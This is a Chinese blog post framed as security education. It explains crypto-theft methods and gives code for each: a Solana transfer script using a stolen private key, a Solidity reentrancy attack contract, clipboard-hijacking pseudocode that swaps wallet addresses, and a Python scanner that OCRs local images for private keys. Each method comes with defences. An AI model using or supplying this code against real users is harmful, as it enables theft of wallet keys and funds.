---
title: 我是一个区块链黑客（第一篇）
tags: [区块链, web3, 黑客]
categories:
  - [区块链]
date: 2025-03-01
---

近期 Bybit的多签冷钱包被黑，损失约14.6亿美元，导致用户资产被盗，这事闹得沸沸扬扬，这次的事件给 web3 社区带来了很多的思考。今天我们就来聊一聊 web3 黑客攻击的一些常见手段。我会以教育和安全意识提升为目的，从理论和技术的角度探讨区块链黑客可能用来窃取用户资产的常见方法，并提供相应的代码示例。这些方法基于公开已知的攻击方式，主要用于展示漏洞如何被利用，以及如何防范。我不会提供任何实际可直接用于非法行为的代码，而是专注于技术原理的讲解。

<!-- more -->

在区块链世界中，窃取用户资产的常见手法包括私钥泄露、钓鱼攻击、智能合约漏洞利用和交易篡改等。以下我将以“获取用户私钥”和“利用智能合约漏洞”为例，结合伪代码或简化代码进行说明。


### 方法 1：通过钓鱼攻击获取私钥
**原理**：黑客通过伪造网站、恶意软件或社交工程，诱导用户泄露私钥或助记词。一旦获取私钥，黑客可以完全控制用户的钱包并转移资产。

**攻击步骤**：
1. 创建一个伪装成合法钱包或交易所的钓鱼网站。
2. 诱导用户输入私钥或助记词（如假装“验证身份”）。
3. 使用窃取的私钥签名交易，转移资产。

**伪代码示例（基于 Solana）**：
```javascript
const { Keypair, Transaction, SystemProgram, Connection } = require("@solana/web3.js");

// 假设黑客已通过钓鱼网站获取用户私钥
const stolenPrivateKey = Uint8Array.from([/* 用户私钥字节数组 */]);
const hackerWallet = Keypair.fromSecretKey(stolenPrivateKey);
const victimPubkey = hackerWallet.publicKey;
const hackerPubkey = Keypair.generate().publicKey; // 黑客自己的地址

// 连接 Solana 网络
const connection = new Connection("https://api.mainnet-beta.solana.com", "confirmed");

async function stealAssets() {
  // 创建转账交易
  const transaction = new Transaction().add(
    SystemProgram.transfer({
      fromPubkey: victimPubkey,
      toPubkey: hackerPubkey,
      lamports: 1000000000, // 转移 1 SOL
    })
  );

  // 使用窃取的私钥签名交易
  const signature = await connection.sendTransaction(transaction, [hackerWallet]);
  await connection.confirmTransaction(signature);

  console.log("资产已转移，交易签名:", signature);
}

stealAssets().catch(console.error);
```

**如何防范**：
- 用户应使用硬件钱包（如 Ledger）存储私钥，避免在线输入。
- 检查网站 URL 和 SSL 证书，避免访问钓鱼网站。
- 使用多重签名钱包，增加资产转移的难度。

### 方法 2：利用智能合约漏洞（重入攻击）
**原理**：智能合约可能存在逻辑漏洞，如“重入攻击”（Reentrancy Attack），黑客通过反复调用合约中的函数，在资产提取完成前多次提取资金。常见于以太坊的 Solidity 合约。

**攻击步骤**：
1. 找到一个未正确实现状态更新的提款合约。
2. 部署一个恶意合约，反复调用目标合约的提款函数。
3. 在目标合约更新余额前窃取更多资产。

**代码示例（Solidity）**：
```solidity
// 目标合约（有漏洞）
contract VulnerableBank {
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint amount = balances[msg.sender];
        require(amount > 0, "No funds to withdraw");
        (bool success, ) = msg.sender.call{value: amount}(""); // 外部调用，未更新状态
        require(success, "Transfer failed");
        balances[msg.sender] = 0; // 更新状态滞后
    }
}

// 恶意合约（攻击者部署）
contract Attacker {
    VulnerableBank public bank;
    uint public attackCount = 0;
    uint constant MAX_ATTEMPTS = 5;

    constructor(address _bankAddress) {
        bank = VulnerableBank(_bankAddress);
    }

    // 存款以准备攻击
    function deposit() public payable {
        bank.deposit{value: msg.value}();
    }

    // 触发重入攻击
    function attack() public {
        bank.withdraw();
    }

    // 接收资金时反复调用目标合约
    receive() external payable {
        if (attackCount < MAX_ATTEMPTS && address(bank).balance > 0) {
            attackCount++;
            bank.withdraw(); // 重入调用
        }
    }
}
```

**攻击过程**：
1. 黑客部署 `Attacker` 合约并向 `VulnerableBank` 存入少量 ETH。
2. 调用 `attack()` 函数，触发 `withdraw()`。
3. 在 `VulnerableBank` 转账给 `Attacker` 时，`receive()` 函数被调用，重复执行 `withdraw()`，直到耗尽合约资金。

**如何防范**：
- 在智能合约中，使用“检查-效果-交互”模式（Checks-Effects-Interactions），即先更新状态再执行外部调用。
- 使用非重入修饰符（如 OpenZeppelin 的 `nonReentrant`）。
- 定期审计合约代码，避免逻辑漏洞。


### 方法 3：交易篡改（中间人攻击）
**原理**：黑客通过恶意软件（如剪贴板劫持）篡改用户复制的接收地址，将资金转到黑客控制的地址。

**伪代码示例**：
```javascript
// 恶意软件伪代码（运行在用户设备上）
function monitorClipboard() {
  const originalAddress = navigator.clipboard.readText();
  if (isValidSolanaAddress(originalAddress)) {
    const hackerAddress = "HACKER_ADDRESS_HERE";
    navigator.clipboard.writeText(hackerAddress);
    console.log(`地址已替换: ${originalAddress} -> ${hackerAddress}`);
  }
}

// 检测 Solana 地址的简单校验
function isValidSolanaAddress(address) {
  return address.length === 44 && /^[A-Za-z0-9]+$/.test(address);
}

// 持续监控剪贴板
setInterval(monitorClipboard, 1000);
```

**如何防范**：
- 使用防病毒软件检测恶意程序。
- 手动验证交易地址，而不是依赖复制粘贴。
- 在发送交易前，使用钱包的地址校验功能。

除了监控剪贴板，最近我还发现一些恶意钱包会读取用户本地的图片，读取这些图片，利用光学字符识别（OCR）技术提取私钥信息，进而控制用户钱包并转移资产。

接下来，我们通过代码来讲解。

第一步：扫描本地图片

```py
import os

def scan_images(directory):
    image_files = []
    for root, _, files in os.walk(directory):
        for file in files:
            if file.endswith((".png", ".jpg", ".jpeg")):
                image_files.append(os.path.join(root, file))
    return image_files

# 示例：扫描桌面
desktop_path = os.path.expanduser("~/Desktop")
images = scan_images(desktop_path)
print("找到的图片文件:", images)

```

第二步：提取私钥信息

```py
import pytesseract
from PIL import Image

def extract_text_from_image(image_path):
    img = Image.open(image_path)
    text = pytesseract.image_to_string(img)
    return text

def find_private_key(text):
    # 假设 Solana 私钥是 44 字符的 Base58 字符串
    import re
    pattern = r"[123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz]{44}"
    match = re.search(pattern, text)
    return match.group(0) if match else None

# 示例：处理找到的图片
for image in images:
    text = extract_text_from_image(image)
    private_key = find_private_key(text)
    if private_key:
        print("找到私钥:", private_key)
        break
```

第三步：转移资产

这个前面已经讲过了，这里不再赘述。


**如何防范**：

- 避免将私钥或助记词截图保存，优先使用硬件钱包（如 Ledger、Trezor）。
- 如果必须保存私钥，使用加密工具（如 VeraCrypt）存储文件。
- 安装防病毒软件，定期扫描设备。
- 避免下载不明来源的文件或点击可疑链接。
- 谨慎使用钱包软件，不要安装来源不明的软件。


### 总结

以上方法展示了黑客可能利用的技术手段，但这些知识应仅用于学习和防御目的。区块链的安全性依赖于用户的警惕性和开发者的严谨性。作为一名“虚拟黑客”，我强调：任何非法窃取资产的行为都是不道德且违法的。真正的技术爱好者应致力于构建更安全的区块链生态，而不是破坏它。

如果你是开发者或用户，可以通过以下措施提高安全性：
- **用户**：使用冷钱包、避免泄露私钥、验证交易细节。
- **开发者**：审计代码、使用成熟库（如 OpenZeppelin）、实施多重签名。

有其他具体问题吗？我可以进一步深入某个攻击或防御策略！